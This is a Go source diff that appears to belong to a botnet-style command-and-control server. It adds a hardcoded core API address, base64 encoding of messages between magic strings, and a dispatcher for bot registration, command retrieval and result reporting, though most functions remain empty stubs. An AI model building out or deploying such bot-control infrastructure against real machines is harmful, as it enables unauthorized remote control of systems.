@@ -10,6 +10,9 @@ import (
 	"strings"
 )
 
+// CORE is the address/port of the meteor core API
+var CORE = "http://172.69.1.1:9999"
+
 // PORT : port to listen on
 var PORT = "5656"
 
@@ -76,28 +79,50 @@ func decodePayload(payload string) string {
 	return string(data)
 }
 
+func encodePayload(data string, mode string, aid string) string {
+	preEnc := mode + "||" + aid + "||" + data
+	encStr := base64.StdEncoding.EncodeToString([]byte(preEnc))
+	fin := MAGICSTR + encStr + MAGICTERMSTR
+	return fin
+}
+
 // take string of payload, depending on mode/arguments: handle it
-func handlePayload(payload string) bool {
-	return true
+func handlePayload(payload string) string {
+	splitPayload := strings.SplitN(payload, "||", 3)
+	mode := splitPayload[0]
+	aid := splitPayload[1]
+	data := splitPayload[2]
+	retval := ""
+	switch mode {
+	case "C":
+		retval = registerBot(data)
+	case "D":
+		retval = getCommand(data)
+	case "E":
+		retval = addResult(data, aid)
+	default:
+		return ""
+	}
+	return retval
 }
 
 // take params from bot and register it in the DB
-func registerBot(uuid string, hostname string, interval int, delta int) bool {
-	return true
+func registerBot(payload string) string {
+	splitPayload := strings.Split(payload, "||")
+	uid := splitPayload[0]
+	intrv := splitPayload[1]
+	dlt := splitPayload[2]
+	hn := splitPayload[3]
+	return ""
 }
 
 // pull all commands from DB with associated uuid
-func getCommand(uuid string) []string {
-	return nil
+func getCommand(payload string) string {
+	return ""
 }
 
 // send the action result back to the DB for feedback tracking
-func addResult(result string, actionid int) bool {
-	return true
-}
-
-// generate the formatted and base64 encoded string, ready to be sent accross wire
-func buildPayload(mode string, arguments string, actionid int) string {
+func addResult(payload string, aid string) string {
 	return ""
 }
 
